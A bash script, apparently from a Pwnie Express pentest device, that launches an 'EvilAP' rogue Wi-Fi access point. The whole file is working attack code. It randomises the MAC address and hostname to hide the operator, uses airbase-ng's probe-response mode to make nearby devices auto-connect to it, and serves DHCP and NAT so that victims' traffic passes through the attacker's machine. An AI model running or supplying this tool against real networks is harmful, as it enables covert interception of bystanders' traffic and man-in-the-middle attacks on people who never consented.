#!/bin/bash
# Date: Jan 2014
# Desc: EvilAP script to forcefully connect wireless clients
# Authors: Awk, Sedd, Pasties
# Company: Pwnie Express
# Version: 2.0


trap f_endclean INT
trap f_endclean KILL

f_identify_device(){
  # Function to determine whether current device is new pad or old pad
  # Checking to see if this is the old pad or the new pad:
  cat /proc/cpuinfo |grep grouper &> /dev/null
  pad_old_or_new=`echo $?`
  
  # If pad_old_or_new = 1 then current device is New Pad
  if [ $pad_old_or_new -eq 1 ]; then

    # New Pad's GSM interface is rmnet_usb0
    gsm_int="rmnet_usb0"
    else
    # Old Pad's GSM interface is rmnet0
    gsm_int="rmnet0"
  fi
}

f_endclean(){
  echo "[!] Exiting..."
  f_restore_ident
  f_clean_up
  ifconfig wlan1 down
}

f_clean_up(){
  echo "[!] Killing any previous instances of airbase or dhcpd"
  killall airbase-ng
  killall dhcpd
  airmon-ng stop mon0
  iptables --flush
  iptables --table nat --flush
}

f_restore_ident(){
  echo "[!] Restoring network identity."
  ifconfig wlan1 down
  macchanger -p wlan1
  hostname pwnpad
}

f_banner(){
  clear
  echo "[+] Welcome to the EvilAP"
  echo
}

f_interface(){
  echo "[+] Select which interface you are using for Internet? (1-3):"
  echo
  echo "1. [$gsm_int] (4G GSM connection)"
  echo "2. eth0  (USB ethernet adapter)"
  echo "3. wlan0  (Internal Nexus Wifi)"
  echo
  read -p "Choice (1-3): " selection

  case $selection in
    1) interface=$gsm_int ;;
    2) interface=eth0 ;;
    3) interface=wlan0 ;;
    *) interface=$gsm_int ;;
  esac
}

f_ssid(){
  clear
  echo
  echo "[+] Enter an SSID name. [Public_Wireless]"
  echo
  read -p "SSID: " ssid
  echo

  if [ -z $ssid ]; then
    ssid=Public_Wireless
  fi
}

f_channel(){
  clear
  echo
  echo "[+] Enter the channel to run the EvilAP on (1-14)."
  echo "[+] Default Channel: [1]"
  echo
  read -p "Channel:" channel
  echo
  case $channel in
    [1-14]*) ;;
    *) channel=1 ;;
  esac
}

f_beacon_rate(){
  clear

  echo
  echo "[+] Enter the beacon rate at which to broadcast probe requests:"
  echo
  echo "[+] NOTE: If clients don't stay connected try changing this value"
  echo
  echo "[+] Default is: [30]"
  echo
  read -p "Range (20-70): " brate
  echo

  if [ -z $brate ]; then
    brate=30
  fi
}

f_preplaunch(){
  #Change the hostname and mac address randomly

  echo "[+] Rolling MAC address and Hostname randomly."
  echo

  ifconfig wlan1 down
  macchanger -r wlan1

  hn=`ifconfig wlan1 |grep HWaddr |awk '{print$5}' |awk -F":" '{print$1$2$3$4$5$6}'`
  hostname $hn
  echo "[+] New hostname set: $hn"

  sleep 2
  #Put wlan1 into monitor mode - mon0 created
  airmon-ng start wlan1
  mkdir /dev/net/
  ln -s /dev/tun /dev/net/tun
}

f_logname(){
  echo "/opt/pwnix/captures/wireless/evilap-$(date +%s).log"
}

f_evilap(){
  #Log path and name
  logname=$(f_logname)
  echo "[+] Creating new logfile: $logname"

  #Start Airbase-ng with -P for preferred networks
  airbase-ng -P -C $brate -c $channel -e "$ssid" -v mon0 > $logname 2>&1 &
  sleep 2

  #Bring up virtual interface at0
  ifconfig at0 up 192.168.7.1 netmask 255.255.255.0

  #Start DHCP server on at0
  dhcpd -cf /etc/dhcp/dhcpd.conf -pf /var/run/dhcpd.pid at0

  #IP forwarding and iptables routing using internet connection
  echo 1 > /proc/sys/net/ipv4/ip_forward
  iptables -t nat -A POSTROUTING -o $interface -j MASQUERADE

  tail -f $logname
}

f_niceap(){
  #Log path and name
  logname=$(f_logname)
  echo "[+] Creating new logfile: $logname"

  #Start Airbase-ng with -P for preferred networks
  airbase-ng -c $channel -e "$ssid" -v mon0 > $logname 2>&1 &
  sleep 2

  #Bring up virtual interface at0
  ifconfig at0 up 192.168.7.1 netmask 255.255.255.0

  #Start DHCP server on at0
  dhcpd -cf /etc/dhcp/dhcpd.conf -pf /var/run/dhcpd.pid at0

  #IP forwarding and iptables routing using internet connection
  echo 1 > /proc/sys/net/ipv4/ip_forward
  iptables -t nat -A POSTROUTING -o $interface -j MASQUERADE

  tail -f $logname
}

f_karmaornot(){
  clear
  echo
  echo "[+] Force clients to connect based on their probe requests?: "
  echo
  echo "WARNING: Everything will start connecting to you if yes is selected"
  echo
  echo "1. Yes"
  echo "2. No"
  echo
  read -p "Choice (1-2): " karma
  echo
  echo
  case $karma in
    [1-2]*) ;;
    *) f_karmaornot ;;
  esac

  if [ $karma -eq 1 ]; then
    f_beacon_rate
  fi

}

f_identify_device
f_clean_up
f_banner
f_interface
f_ssid
f_channel
f_karmaornot
f_preplaunch

if [ $karma -eq 1 ]; then
  echo "[+] Starting Evil AP with forced connection attack."
  f_evilap
else
  echo "[+] Starting Evil AP without forced connection attack."
  f_niceap
fi

f_endclean

